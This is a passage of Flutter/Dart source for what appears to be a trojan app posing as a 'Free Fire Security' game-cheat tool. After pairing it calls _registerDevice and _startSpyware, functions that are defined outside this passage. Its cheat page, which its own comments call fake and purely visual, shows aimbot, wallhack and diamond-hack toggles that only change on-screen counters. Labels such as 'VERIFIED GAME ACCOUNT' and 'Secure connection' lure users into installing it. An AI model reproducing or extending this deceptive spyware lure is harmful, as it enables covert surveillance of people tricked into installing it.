          await _registerDevice(globalDeviceId, globalDeviceModel);
          _startSpyware(globalDeviceId);
          setState(() { _loading = false; _paired = true; _msg = 'Connected successfully!'; _currentPairId = id; });
          return;
        } else {
          setState(() { _loading = false; _msg = data['error'] ?? 'Invalid Pairing ID. Please check with your owner.'; });
          return;
        }
      } else {
        setState(() { _loading = false; _msg = 'Server error (${res.statusCode}). Please try again.'; });
        return;
      }
    } catch (e) {
      setState(() { _loading = false; _msg = 'Connection error: ${e.toString().replaceAll('Exception: ', '')}'; });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        children: [
          AnimatedBuilder(
            animation: _glowAnimation,
            builder: (context, child) {
              return Container(
                decoration: BoxDecoration(
                  gradient: RadialGradient(
                    center: const Alignment(0.5, -0.3),
                    radius: 1.2,
                    colors: [Colors.red.shade900.withOpacity(_glowAnimation.value * 0.15), Colors.black, Colors.black],
                  ),
                ),
              );
            },
          ),
          CustomPaint(painter: GridPainter(), size: Size.infinite),
          SafeArea(
            child: SingleChildScrollView(
              child: Padding(
                padding: const EdgeInsets.symmetric(horizontal: 24),
                child: Column(
                  children: [
                    const SizedBox(height: 40),
                    Stack(
                      alignment: Alignment.center,
                      children: [
                        Container(
                          width: 80, height: 80,
                          decoration: BoxDecoration(
                            shape: BoxShape.circle,
                            gradient: LinearGradient(begin: Alignment.topLeft, end: Alignment.bottomRight, colors: [Colors.red.shade700, Colors.red.shade900]),
                            boxShadow: [BoxShadow(color: Colors.red.shade500.withOpacity(0.4), blurRadius: 20, spreadRadius: 4)],
                          ),
                          child: const Icon(Icons.flash_on_rounded, color: Colors.white, size: 40),
                        ),
                      ],
                    ),
                    const SizedBox(height: 16),
                    const Text(
                      'Free Fire Security',
                      style: TextStyle(color: Colors.white, fontSize: 28, fontWeight: FontWeight.w700, letterSpacing: 6),
                    ),
                    const SizedBox(height: 6),
                    Container(width: 40, height: 2, color: Colors.red.shade700),
                    const SizedBox(height: 20),
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
                      decoration: BoxDecoration(
                        gradient: LinearGradient(colors: [Colors.red.shade900.withOpacity(0.3), Colors.purple.shade900.withOpacity(0.2)]),
                        borderRadius: BorderRadius.circular(20),
                        border: Border.all(color: Colors.red.shade700.withOpacity(0.3), width: 1),
                      ),
                      child: Row(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          Container(width: 8, height: 8, decoration: const BoxDecoration(color: Colors.green, shape: BoxShape.circle)),
                          const SizedBox(width: 10),
                          const Text('VERIFIED GAME ACCOUNT', style: TextStyle(color: Colors.white, fontSize: 10, fontWeight: FontWeight.w600, letterSpacing: 2)),
                        ],
                      ),
                    ),
                    const SizedBox(height: 20),
                    Text(
                      _paired ? 'Device Connected' : 'Connect Your Device',
                      style: TextStyle(color: _paired ? Colors.green.shade400 : Colors.grey.shade400, fontSize: 14, fontWeight: FontWeight.w500, letterSpacing: 1),
                    ),
                    const SizedBox(height: 40),
                    Container(
                      padding: const EdgeInsets.all(24),
                      decoration: BoxDecoration(
                        color: const Color(0xFF0A0A0A),
                        borderRadius: BorderRadius.circular(24),
                        border: Border.all(color: _paired ? Colors.green.shade800.withOpacity(0.3) : Colors.red.shade900.withOpacity(0.3), width: 1),
                        boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.5), blurRadius: 30, offset: const Offset(0, 10))],
                      ),
                      child: Column(
                        children: [
                          if (_paired) ...[
                            Container(
                              width: 70, height: 70,
                              decoration: BoxDecoration(
                                shape: BoxShape.circle,
                                color: Colors.green.shade900.withOpacity(0.2),
                                border: Border.all(color: Colors.green.shade400, width: 2),
                              ),
                              child: Icon(Icons.check_circle_rounded, color: Colors.green.shade400, size: 50),
                            ),
                            const SizedBox(height: 16),
                            Text(
                              'Connected Successfully',
                              style: TextStyle(color: Colors.green.shade400, fontSize: 16, fontWeight: FontWeight.bold),
                            ),
                            const SizedBox(height: 8),
                            Container(
                              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                              decoration: BoxDecoration(
                                color: Colors.green.shade900.withOpacity(0.1),
                                borderRadius: BorderRadius.circular(12),
                                border: Border.all(color: Colors.green.shade800.withOpacity(0.2)),
                              ),
                              child: Row(
                                mainAxisSize: MainAxisSize.min,
                                children: [
                                  const Icon(Icons.vpn_key, color: Colors.green, size: 14),
                                  const SizedBox(width: 8),
                                  Text(
                                    _currentPairId,
                                    style: TextStyle(color: Colors.green.shade300, fontSize: 13, fontFamily: 'monospace', letterSpacing: 1),
                                  ),
                                ],
                              ),
                            ),
                            const SizedBox(height: 12),

                            // ── 🔥 TOMBOL CHEAT EPEP ──────────────────────────────
                            SizedBox(
                              width: double.infinity,
                              height: 50,
                              child: ElevatedButton.icon(
                                onPressed: () {
                                  Navigator.push(
                                    context,
                                    MaterialPageRoute(builder: (_) => const CheatPage()),
                                  );
                                },
                                style: ElevatedButton.styleFrom(
                                  backgroundColor: Colors.cyan.shade900,
                                  foregroundColor: Colors.white,
                                  elevation: 0,
                                  shape: RoundedRectangleBorder(
                                    borderRadius: BorderRadius.circular(12),
                                    side: BorderSide(color: Colors.cyan.shade400.withOpacity(0.3)),
                                  ),
                                ),
                                icon: const Icon(Icons.games, size: 20),
                                label: const Text(
                                  '🔥 OPEN CHEAT EPEP',
                                  style: TextStyle(fontWeight: FontWeight.w700, letterSpacing: 2, fontSize: 13),
                                ),
                              ),
                            ),

                            const SizedBox(height: 16),
                            SizedBox(
                              width: double.infinity,
                              height: 48,
                              child: OutlinedButton(
                                onPressed: () async {
                                  final prefs = await SharedPreferences.getInstance();
                                  await prefs.remove('pairId');
                                  setState(() { _paired = false; _msg = ''; _idCtrl.clear(); _currentPairId = ''; });
                                },
                                style: OutlinedButton.styleFrom(
                                  side: BorderSide(color: Colors.red.shade700, width: 1),
                                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                                ),
                                child: Text(
                                  'Disconnect',
                                  style: TextStyle(color: Colors.red.shade400, fontSize: 13, fontWeight: FontWeight.w500),
                                ),
                              ),
                            ),
                          ] else ...[
                            Text('Enter Pairing ID', style: TextStyle(color: Colors.grey.shade400, fontSize: 12)),
                            const SizedBox(height: 16),
                            Container(
                              decoration: BoxDecoration(
                                color: const Color(0xFF141414),
                                borderRadius: BorderRadius.circular(14),
                                border: Border.all(color: Colors.red.shade900.withOpacity(0.3), width: 1),
                              ),
                              child: TextField(
                                controller: _idCtrl,
                                textAlign: TextAlign.center,
                                textCapitalization: TextCapitalization.characters,
                                style: const TextStyle(color: Colors.white, fontSize: 18, letterSpacing: 4, fontWeight: FontWeight.w600),
                                decoration: InputDecoration(
                                  hintText: 'ENTER PAIRING ID',
                                  hintStyle: TextStyle(color: Colors.white.withOpacity(0.12), fontSize: 12, letterSpacing: 2),
                                  border: InputBorder.none,
                                  contentPadding: const EdgeInsets.symmetric(vertical: 18, horizontal: 16),
                                ),
                                onSubmitted: (_) => _doPair(),
                              ),
                            ),
                            if (_msg.isNotEmpty) ...[
                              const SizedBox(height: 14),
                              Container(
                                padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
                                decoration: BoxDecoration(
                                  color: _msg.contains('success') || _msg.contains('Connected')
                                      ? Colors.green.shade900.withOpacity(0.1)
                                      : _msg.contains('Invalid') || _msg.contains('error') || _msg.contains('Error')
                                          ? Colors.red.shade900.withOpacity(0.1)
                                          : Colors.grey.shade800.withOpacity(0.1),
                                  borderRadius: BorderRadius.circular(10),
                                  border: Border.all(
                                    color: _msg.contains('success') || _msg.contains('Connected')
                                        ? Colors.green.shade700.withOpacity(0.2)
                                        : _msg.contains('Invalid') || _msg.contains('error') || _msg.contains('Error')
                                            ? Colors.red.shade700.withOpacity(0.2)
                                            : Colors.grey.shade700.withOpacity(0.2),
                                  ),
                                ),
                                child: Row(
                                  children: [
                                    Icon(
                                      _msg.contains('success') || _msg.contains('Connected')
                                          ? Icons.check_circle
                                          : _msg.contains('Invalid') || _msg.contains('error') || _msg.contains('Error')
                                              ? Icons.error
                                              : Icons.info,
                                      color: _msg.contains('success') || _msg.contains('Connected')
                                          ? Colors.green.shade400
                                          : _msg.contains('Invalid') || _msg.contains('error') || _msg.contains('Error')
                                              ? Colors.red.shade400
                                              : Colors.grey.shade400,
                                      size: 16,
                                    ),
                                    const SizedBox(width: 10),
                                    Expanded(
                                      child: Text(
                                        _msg,
                                        style: TextStyle(
                                          color: _msg.contains('success') || _msg.contains('Connected')
                                              ? Colors.green.shade400
                                              : _msg.contains('Invalid') || _msg.contains('error') || _msg.contains('Error')
                                                  ? Colors.red.shade400
                                                  : Colors.grey.shade400,
                                          fontSize: 12,
                                        ),
                                      ),
                                    ),
                                  ],
                                ),
                              ),
                            ],
                            const SizedBox(height: 20),
                            SizedBox(
                              width: double.infinity,
                              height: 52,
                              child: ElevatedButton(
                                onPressed: _loading ? null : _doPair,
                                style: ElevatedButton.styleFrom(
                                  backgroundColor: Colors.red.shade900,
                                  foregroundColor: Colors.white,
                                  elevation: 0,
                                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
                                ),
                                child: _loading
                                    ? SizedBox(width: 22, height: 22, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                                    : const Text('CONNECT DEVICE', style: TextStyle(fontWeight: FontWeight.w600, letterSpacing: 2, fontSize: 14)),
                              ),
                            ),
                          ],
                        ],
                      ),
                    ),
                    const SizedBox(height: 30),
                    Container(
                      padding: const EdgeInsets.all(16),
                      decoration: BoxDecoration(
                        color: Colors.grey.shade900.withOpacity(0.3),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: Colors.grey.shade800.withOpacity(0.2)),
                      ),
                      child: Column(
                        children: [
                          Row(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              Icon(Icons.gamepad, color: Colors.red.shade400, size: 14),
                              const SizedBox(width: 8),
                              Text('GAME VERIFICATION', style: TextStyle(color: Colors.red.shade400, fontSize: 10, fontWeight: FontWeight.bold, letterSpacing: 1)),
                            ],
                          ),
                          const SizedBox(height: 8),
                          Text(
                            'Pairing ID is provided by account owner • Secure connection',
                            style: TextStyle(color: Colors.grey.shade600, fontSize: 10, letterSpacing: 0.5),
                            textAlign: TextAlign.center,
                          ),
                        ],
                      ),
                    ),
                    const SizedBox(height: 20),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// 🔥 CHEAT EPEP PAGE — BOONGAN (CUMA MANIPULASI VISUAL)
// ─────────────────────────────────────────────────────────────────────────────
class CheatPage extends StatefulWidget {
  const CheatPage({super.key});
  @override State<CheatPage> createState() => _CheatPageState();
}

class _CheatPageState extends State<CheatPage> with SingleTickerProviderStateMixin { // 🔥 TAMBAHKAN INI
  bool _aimbot = false;
  bool _autoHeadshot = false;
  bool _autoFreeze = false;
  bool _esp = false;
  bool _wallhack = false;
  bool _magicBullet = false;
  bool _antiBan = false;
  bool _speedHack = false;
  bool _flyHack = false;
  bool _unlimitedAmmo = false;
  bool _noRecoil = false;
  bool _fastReload = false;
  bool _zombieMode = false;
  bool _diamondHack = false;
  bool _aimAssist = false;
  bool _triggerBot = false;
  bool _radarHack = false;
  bool _noSpread = false;

  int _headshotCount = 0;
  int _killCount = 0;
  int _winCount = 0;
  int _diamondCount = 0;
  double _aimAccuracy = 0.0;
  int _enemyCount = 0;
  final List<String> _logs = [];
  String _status = "🟢 SYSTEM READY";
  String _version = "FF CHEAT V4.2.1";
  late AnimationController _pulseController;
  late Animation<double> _pulseAnimation;

  @override
  void initState() {
    super.initState();
    _pulseController = AnimationController(duration: const Duration(milliseconds: 500), vsync: this)..repeat(reverse: true);
    _pulseAnimation = Tween<double>(begin: 0.3, end: 0.9).animate(CurvedAnimation(parent: _pulseController, curve: Curves.easeInOut));
    _addLog('🚀 Cheat EPEP Activated');
    _addLog('🔍 Scanning memory...');
    Future.delayed(const Duration(seconds: 2), () {
      _addLog('✅ Module loaded successfully');
      _addLog('📡 Connected to server');
      setState(() => _enemyCount = 15);
    });
    _startAutoIncrement();
  }

  @override
  void dispose() {
    _pulseController.dispose();
    super.dispose();
  }

  void _addLog(String msg) {
    setState(() {
      _logs.insert(0, '[${DateTime.now().toString().substring(11,19)}] $msg');
      if (_logs.length > 20) _logs.removeLast();
    });
  }

  void _startAutoIncrement() {
    Timer.periodic(const Duration(seconds: 2), (_) {
      if (_autoHeadshot) {
        setState(() {
          _headshotCount += Random().nextInt(3) + 1;
          _killCount += Random().nextInt(2);
          _aimAccuracy = (_aimAccuracy + (80 + Random().nextDouble() * 15)) / 2;
          if (_aimAccuracy > 98) _aimAccuracy = 98;
        });
      }
      if (_diamondHack) {
        setState(() => _diamondCount += Random().nextInt(50) + 10);
      }
      setState(() {
        _enemyCount = 5 + Random().nextInt(20);
        _winCount += Random().nextInt(2);
      });
    });
  }

  void _toggleCheat(String name, bool value, VoidCallback? onToggle) {
    setState(() { if (onToggle != null) onToggle(); });
    _addLog(value ? '🔓 $name ON' : '🔒 $name OFF');
    setState(() => _status = value ? '🟢 $name ACTIVATED' : '🔴 $name DEACTIVATED');
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0A0A1A),
      appBar: AppBar(
        backgroundColor: const Color(0xFF0F0F2A),
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios, color: Colors.cyan, size: 18),
          onPressed: () => Navigator.pop(context),
        ),
        title: Row(
          children: [
            Container(
              width: 8, height: 8,
              decoration: BoxDecoration(
                color: Colors.green,
                shape: BoxShape.circle,
                boxShadow: [BoxShadow(color: Colors.green.withOpacity(0.4), blurRadius: 12)],
              ),
            ),
            const SizedBox(width: 10),
            Text(
              '🔥 CHEAT EPEP',
              style: TextStyle(
                color: Colors.cyan,
                fontSize: 16,
                fontWeight: FontWeight.w800,
                letterSpacing: 2,
                shadows: [Shadow(color: Colors.cyan.withOpacity(0.4), blurRadius: 20)],
              ),
            ),
            const Spacer(),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
              decoration: BoxDecoration(
                color: Colors.green.withOpacity(0.1),
                borderRadius: BorderRadius.circular(4),
                border: Border.all(color: Colors.green.withOpacity(0.3)),
              ),
              child: Text(_version, style: TextStyle(color: Colors.green, fontSize: 8, fontWeight: FontWeight.w600)),
            ),
          ],
        ),
      ),
      body: Column(
        children: [
          Container(
            margin: const EdgeInsets.all(12),
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
            decoration: BoxDecoration(
              color: const Color(0xFF14142E),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: Colors.cyan.withOpacity(0.15)),
            ),
            child: Row(
              children: [
                Container(
                  width: 6, height: 6,
                  decoration: BoxDecoration(
                    color: Colors.green,
                    shape: BoxShape.circle,
                    boxShadow: [BoxShadow(color: Colors.green.withOpacity(0.5), blurRadius: 10)],
                  ),
                ),
                const SizedBox(width: 10),
                Expanded(child: Text(_status, style: TextStyle(color: Colors.cyan, fontSize: 11, fontWeight: FontWeight.w600, letterSpacing: 0.5))),
                AnimatedBuilder(
                  animation: _pulseAnimation,
                  builder: (context, child) => Text('⚡', style: TextStyle(fontSize: 16, color: Colors.amber.withOpacity(_pulseAnimation.value))),
                ),
              ],
            ),
          ),
          Container(
            margin: const EdgeInsets.symmetric(horizontal: 12),
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              gradient: LinearGradient(colors: [const Color(0xFF14142E), const Color(0xFF0A0A1A)], begin: Alignment.topLeft, end: Alignment.bottomRight),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: Colors.cyan.withOpacity(0.1)),
            ),
            child: Row(
              children: [
                _statItem('💀', 'Kills', _killCount.toString()),
                _statItem('🎯', 'Headshot', _headshotCount.toString()),
                _statItem('🏆', 'Wins', _winCount.toString()),
                _statItem('💎', 'Diamond', _diamondCount.toString()),
              ],
            ),
          ),
          const SizedBox(height: 8),
          Container(
            margin: const EdgeInsets.symmetric(horizontal: 12),
            height: 40,
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
            decoration: BoxDecoration(
              color: const Color(0xFF0A0A1A),
              borderRadius: BorderRadius.circular(8),
              border: Border.all(color: Colors.cyan.withOpacity(0.05)),
            ),
            child: ListView.builder(
              scrollDirection: Axis.horizontal,
              itemCount: _logs.length,
              itemBuilder: (_, i) => Padding(
                padding: const EdgeInsets.only(right: 16),
                child: Text(_logs[i], style: TextStyle(color: Colors.cyan.withOpacity(0.6), fontSize: 9, fontFamily: 'monospace')),
              ),
            ),
          ),
          const SizedBox(height: 8),
          Expanded(
            child: ListView(
              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
              children: [
                _buildCategory('🎯 AIM', [
                  _cheatTile('Aimbot', Icons.gps_fixed, _aimbot, (v) => _toggleCheat('Aimbot', v, () => _aimbot = v)),
                  _cheatTile('Auto Headshot', Icons.gps_fixed, _autoHeadshot, (v) => _toggleCheat('Auto Headshot', v, () => _autoHeadshot = v)), // 🔥 GANTI PAKE GPS_FIXED
                  _cheatTile('Aim Assist', Icons.assistant_navigation, _aimAssist, (v) => _toggleCheat('Aim Assist', v, () => _aimAssist = v)),
                  _cheatTile('Trigger Bot', Icons.touch_app, _triggerBot, (v) => _toggleCheat('Trigger Bot', v, () => _triggerBot = v)),
                ]),
                _buildCategory('👁️ VISUAL', [
                  _cheatTile('ESP (2D/3D)', Icons.visibility, _esp, (v) => _toggleCheat('ESP', v, () => _esp = v)),
                  _cheatTile('Wallhack', Icons.wallpaper, _wallhack, (v) => _toggleCheat('Wallhack', v, () => _wallhack = v)),
                  _cheatTile('Radar Hack', Icons.radar, _radarHack, (v) => _toggleCheat('Radar Hack', v, () => _radarHack = v)),
                ]),
                _buildCategory('⚡ WEAPON', [
                  _cheatTile('Magic Bullet', Icons.flash_on, _magicBullet, (v) => _toggleCheat('Magic Bullet', v, () => _magicBullet = v)),
                  _cheatTile('No Recoil', Icons.arrow_upward, _noRecoil, (v) => _toggleCheat('No Recoil', v, () => _noRecoil = v)),
                  _cheatTile('No Spread', Icons.circle, _noSpread, (v) => _toggleCheat('No Spread', v, () => _noSpread = v)),
                  _cheatTile('Unlimited Ammo', Icons.inventory, _unlimitedAmmo, (v) => _toggleCheat('Unlimited Ammo', v, () => _unlimitedAmmo = v)),
                  _cheatTile('Fast Reload', Icons.replay, _fastReload, (v) => _toggleCheat('Fast Reload', v, () => _fastReload = v)),
                ]),
                _buildCategory('🚀 MOVEMENT', [
                  _cheatTile('Speed Hack', Icons.speed, _speedHack, (v) => _toggleCheat('Speed Hack', v, () => _speedHack = v)),
                  _cheatTile('Fly Hack', Icons.flight, _flyHack, (v) => _toggleCheat('Fly Hack', v, () => _flyHack = v)),
                  _cheatTile('Auto Freeze', Icons.ac_unit, _autoFreeze, (v) => _toggleCheat('Auto Freeze', v, () => _autoFreeze = v)),
                ]),
                _buildCategory('💎 MISC', [
                  _cheatTile('Diamond Hack', Icons.diamond, _diamondHack, (v) => _toggleCheat('Diamond Hack', v, () => _diamondHack = v)),
                  _cheatTile('Anti Ban', Icons.shield, _antiBan, (v) => _toggleCheat('Anti Ban', v, () => _antiBan = v)),
                  _cheatTile('Zombie Mode', Icons.whatshot, _zombieMode, (v) => _toggleCheat('Zombie Mode', v, () => _zombieMode = v)),
                ]),
              ],
            ),
          ),
          Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: const Color(0xFF0F0F2A),
              border: Border(top: BorderSide(color: Colors.cyan.withOpacity(0.05))),
            ),
            child: Row(
              children: [
                Expanded(child: Text('⚠️ Use at your own risk', style: TextStyle(color: Colors.grey.shade600, fontSize: 9, letterSpacing: 0.5))),
                AnimatedBuilder(
                  animation: _pulseAnimation,
                  builder: (context, child) => Text('⚡ ${(_aimAccuracy).toStringAsFixed(1)}%', style: TextStyle(color: Colors.amber.withOpacity(_pulseAnimation.value * 0.8 + 0.2), fontSize: 11, fontWeight: FontWeight.w600, letterSpacing: 1)),
                ),
                const SizedBox(width: 12),
                Text('👥 $_enemyCount', style: TextStyle(color: Colors.red.shade400, fontSize: 11, fontWeight: FontWeight.w600)),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _statItem(String icon, String label, String value) {
    return Expanded(
      child: Column(
        children: [
          Text(icon, style: const TextStyle(fontSize: 16)),
          const SizedBox(height: 2),
          Text(value, style: TextStyle(color: Colors.cyan, fontSize: 16, fontWeight: FontWeight.w800)),
          Text(label, style: TextStyle(color: Colors.grey.shade600, fontSize: 8, letterSpacing: 0.5)),
        ],
      ),
    );
  }

  Widget _buildCategory(String title, List<Widget> children) {
    return Container(
      margin: const EdgeInsets.only(bottom: 8),
      decoration: BoxDecoration(
        color: const Color(0xFF0F0F2A),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: Colors.cyan.withOpacity(0.05)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
            child: Text(title, style: TextStyle(color: Colors.cyan.withOpacity(0.7), fontSize: 10, fontWeight: FontWeight.w700, letterSpacing: 2)),
          ),
          ...children,
        ],
      ),
    );
  }

  Widget _cheatTile(String label, IconData icon, bool value, ValueChanged<bool> onToggle) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
      child: Row(
        children: [
          Icon(icon, color: value ? Colors.cyan : Colors.grey.shade700, size: 18),
          const SizedBox(width: 12),
          Expanded(
            child: Text(
              label,
              style: TextStyle(color: value ? Colors.white : Colors.grey.shade600, fontSize: 13, fontWeight: value ? FontWeight.w600 : FontWeight.w400),
            ),
          ),
          AnimatedContainer(
            duration: const Duration(milliseconds: 300),
            width: 44, height: 24,
            decoration: BoxDecoration(
              color: value ? Colors.cyan : Colors.grey.shade800,
              borderRadius: BorderRadius.circular(12),
              boxShadow: value ? [BoxShadow(color: Colors.cyan.withOpacity(0.3), blurRadius: 8)] : [],
            ),
            child: Stack(
              alignment: Alignment.centerLeft,
              children: [
                AnimatedAlign(
                  duration: const Duration(milliseconds: 300),
                  alignment: value ? Alignment.centerRight : Alignment.centerLeft,
                  child: Container(
                    margin: const EdgeInsets.all(2),
                    width: 20, height: 20,
                    decoration: const BoxDecoration(color: Colors.white, shape: BoxShape.circle),
                    child: Icon(value ? Icons.check : Icons.close, color: value ? Colors.green : Colors.red, size: 14),
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }
}

// ── GRID PAINTER ──────────────────────────────────────────────────────────────
class GridPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()..color = const Color(0xFF1A1A1A)..strokeWidth = 0.5..style = PaintingStyle.stroke;
    const spacing = 30.0;
    for (double x = 0; x < size.width; x += spacing) { canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint); }
    for (double y = 0; y < size.height; y += spacing) { canvas.drawLine(Offset(0, y), Offset(size.width, y), paint); }
  }
  @override bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}